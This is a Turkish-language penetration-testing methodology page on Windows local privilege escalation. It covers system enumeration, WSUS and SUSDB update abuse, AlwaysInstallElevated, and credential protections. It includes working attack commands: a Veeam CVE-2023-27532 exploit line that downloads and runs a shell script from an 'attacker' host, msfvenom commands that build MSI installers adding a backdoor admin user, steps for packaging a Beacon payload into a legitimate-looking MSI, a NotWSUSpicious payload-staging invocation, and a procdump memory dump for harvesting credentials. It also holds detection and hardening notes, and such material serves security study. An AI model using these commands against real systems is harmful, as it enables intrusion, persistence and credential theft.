# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, çeşitli temel rehberlerdeki genel Windows privilege-escalation metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışı ayrıca topluluk workshop'larından ve checklist'lerden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyali, Windows privilege escalation hakkındaki DerbyCon sunumunu da içerir.<sup>[[5]](#references)</sup>

## Initial Windows Theory

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta **sistemi enumerate etmenizi**, executable'lar çalıştırmanızı veya hatta **aktivitelerinizi tespit etmelerini** **engelleyebilecek** çeşitli unsurlar vardır. Privilege escalation enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **defense** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri bypass edildiğinde prompt olmadan High IL seviyesine ulaşmak için abuse edilebilir. Özel UIAccess/Admin Protection bypass workflow'una buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, arbitrary bir SYSTEM registry write gerçekleştirmek için abuse edilebilir (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows build'leri ayrıca, privileged bir local NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE yolu da sunmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünde bilinen herhangi bir vulnerability olup olmadığını kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **devasa attack surface** gösterilir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'u içerir)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutları, komut çağrılarını ve script'lerin bölümlerini kapsayacak şekilde kaydedilir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini kullanın.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betiğin yürütülmesine ilişkin eksiksiz bir etkinlik ve tam içerik kaydı alınır; böylece her kod bloğu çalışırken belgelenir. Bu işlem, adli incelemeler ve kötü amaçlı davranışların analizi için değerli olan kapsamlı bir denetim izi sağlar. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı içgörüler sunulur.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlüğe kaydedilen olaylar, Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

Öncelikle aşağıdakini cmd içinde çalıştırarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edin:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Şunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman **istismar edilebilir durumdadır.** Son registry değeri `0` ise WSUS girdisi yok sayılır.

Bu güvenlik açıklarını istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz - Bunlar, SSL kullanılmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için kullanılan MiTM weaponized exploit script'leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, bug'ın istismar ettiği açıktır:

> Yerel kullanıcı proxy'mizi değiştirme yetkisine sahipsek ve Windows Updates, Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve asset'ımızda elevated user olarak code çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı yerel olarak çalıştırma yetkisine sahip oluruz.
>
> Ayrıca WSUS service, mevcut kullanıcının settings'lerini kullandığından certificate store'unu da kullanır. WSUS hostname'i için self-signed certificate oluşturup bu certificate'i mevcut kullanıcının certificate store'una eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, certificate üzerinde trust-on-first-use türü bir validation uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate kullanıcı tarafından trusted ise ve doğru hostname'e sahipse service tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool'unu kullanarak istismar edebilirsiniz (liberated olduktan sonra).

### SUSDB custom-update abuse: `.txt`/`.esd` üzerinden unsigned payloads

Bu, bir HTTP WSUS connection'ını intercept etmekten farklı bir trust-boundary failure'dır: ön koşul, custom update publish ve approve etmek için **WSUS database'inin (`SUSDB`) stored procedures**'larına yeterli erişimdir. Pratik bir giriş yolu, upstream WSUS computer account'unu `SUSDB` barındıran ayrı bir MSSQL server'a relay etmektir; tam ön koşul deployment'a özgüdür, bu nedenle SQL administrator rights varsaymak yerine önce `EXECUTE` permissions'larını enumerate edin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication'ını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı attack path için [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) sayfasına bakın.

#### Update'i build etme, target etme ve approve etme

Custom-update workflow'u, restricted bir publishing API olarak legitimate WSUS procedures'larını kullanır. Önemli state transition'lar şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedures |
| --- | --- |
| Update metadata'sını import etme | `spImportUpdate` |
| Prerequisite, localized ve extended XML fragment'larını depolama | `spSaveXMLFragment` |
| Content digest'ini attacker-controlled URL ile ilişkilendirme | `spSetBatchURL` |
| Bir computer group'u enumerate/create etme ve client'ı ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu group için installation'ı approve etme | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

File name, digest'ler, size ve `CommandLineInstallation` handler'ı import edilen metadata/fragments arasında aynı olmalıdır. Content URL'sini ve target group'u atadıktan sonra final approval aşağıdakine benzer; örnek GUID'leri tekrar kullanmak yerine yeni update, group ve deployment identifier'ları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Extension-driven signature bypass

WSUS normalde rastgele imzasız çalıştırılabilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle örneğin `payload.exe.txt` olarak adlandırılmış, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra update'in command-line installation handler'ı tarafından başlatılabilir. Bu, imza sahteciliği değil, bir policy/type-confusion hatasıdır.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-compatible staging ve automation

`spDeployUpdate` çağrısı, WSUS'un kayıtlı içeriği fetch etmesini sağlar. Origin, BITS'in HTTP beklentilerini karşılamalıdır: Tek başına erişilebilir bir URL yeterli değildir; çünkü transfer, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir server, BITS'in Range protocol header gerektirdiğini belirten WSUS synchronization `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bunu çalıştırmak üzere modified MSSQL client içerir ve content staging için `BitsWebServer.py` dosyasını sağlar. Yetkili bir lab ortamında kullanılabilecek minimal invocation şöyledir:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Kullanıcı müdahalesi olmadan çalıştırma ve yeniden deneme kalıcılığı

Client-side etkileşim policy'ye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altında bulunan `4 - Auto download and schedule install` seçeneği, onaylanmış bir update'in kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan indirilmesini ve yapılandırılmış schedule'a göre kurulmasını sağlar. Testlerde, update'i başarısız/eksik kalan bir payload callback process'i sonlandıktan hemen sonra yeniden sunuldu; bu nedenle retry davranışı tekrarlanan execution persistence'a dönüşebilir. Ancak client, update-failed durumunu açığa çıkardığı için bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Detection ve hardening pivot'ları

Bu chain'den elde edilebilecek faydalı server- ve client-side pivot'lar şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` execution'larını audit edin; yeni targeting group'larını, external content origin'lerini, `.txt`/`.esd` update payload'larını ve beklenmeyen principal'lar (özellikle computer hesabı olmayan hesaplar) tarafından gerçekleştirilen deployment'ları araştırın.
- `C:\Program Files\Update Services\LogFiles` konumunda `ContentSyncAgent`, `FileVerified`, yazım hatalı `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; verification işlemini suffix'e güvenmek yerine payload extension'ı ve content magic ile ilişkilendirin.
- Windows Update installation işlemlerinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adlarını taşıyan content'ten kaynaklanan PE execution ya da beklenmeyen child/network activity'yi araştırın.
- Desteklendiği durumlarda database service üzerinde Extended Protection for Authentication zorunlu kılın ve database network erişimini WSUS server ile yetkili administrative system'larla sınırlandırın. Custom-update procedure'ları üzerindeki `EXECUTE` izinlerini en aza indirin ve audit edin.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok enterprise agent, localhost IPC surface'i ve privileged bir update channel'ı açığa çıkarır. Enrollment işlemi attacker server'a yönlendirilebiliyor ve updater rogue root CA'ya veya zayıf signer kontrollerine güveniyorsa, local user SYSTEM service'in kuracağı malicious bir MSI gönderebilir. Netskope stAgentSvc chain'i (CVE-2025-0309) temel alınarak hazırlanmış genelleştirilmiş bir technique için buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam B&R < `11.0.1.1261`, attacker-controlled mesajları işleyen **TCP/9401** üzerindeki bir localhost service'i açığa çıkarır ve **NT AUTHORITY\SYSTEM** olarak arbitrary command çalıştırılmasına izin verir.<sup>[[12]](#references)</sup>

- **Recon**: listener'ı ve version'ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı directory'ye yerleştirin, ardından local socket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak yürütür.
## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing** özelliğinin zorunlu kılınmadığı ortamlar, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights yetkilerine sahip olması ve kullanıcıların domain içinde bilgisayar oluşturabilmesi yer alır. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**exploit**'i [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırının akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

**Bu** 2 kayıt defteri girdisi **etkinse** (değeri **0x1** ise), herhangi bir yetkiye sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Ayrıcalıkları yükseltmek için mevcut dizinin içinde bir Windows MSI binary'si oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme işlemi isteyen önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Ayrıcalıkları yükseltmek için oluşturulan binary'yi çalıştırmanız yeterlidir.

### MSI Wrapper

Bu tools kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız bir "**.bat**" dosyasını wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**
- **Visual Studio**'yu açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini seçin ve **Create**'e tıklayın.
- 4 adımın 3. adımına (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
- **Author** ve **Manufacturer** gibi, kurulan uygulamanın daha meşru görünmesini sağlayabilecek diğer özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini seçin.
- **Install** seçeneğine sağ tıklayın ve **Add Custom Action** seçeneğini seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz Beacon payload'ının execute edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build edin**.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** **background**'da execute etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüsler ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar neyin **günlüğe kaydedileceğini** belirler; bu nedenle dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding kapsamında logların nereye gönderildiğini bilmek ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve bir domaine katılmış bilgisayarlardaki her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; böylece yetkili olmaları durumunda yerel admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS içinde** (Local Security Authority Subsystem Service) saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** için Local Security Authority (LSA) için gelişmiş koruma sunarak sistemi daha da güvenli hale getirdi.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard**, **Windows 10** ile kullanıma sunulmuştur. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl abuse edileceği hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar** ve bunların nasıl abuse edileceği hakkında bilgi edinmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum Açmış Kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini alma
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parolaları kontrol edin**.\
Çalışan herhangi bir **binary'yi üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) gerçekleştirmek için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışan olası [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunları kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**İşlem ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem binary'lerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellekten Parola Madenciliği

sysinternals aracındaki **procdump** kullanılarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi servisler **kimlik bilgilerini bellekte açık metin olarak** tutar; belleği döküp kimlik bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Services

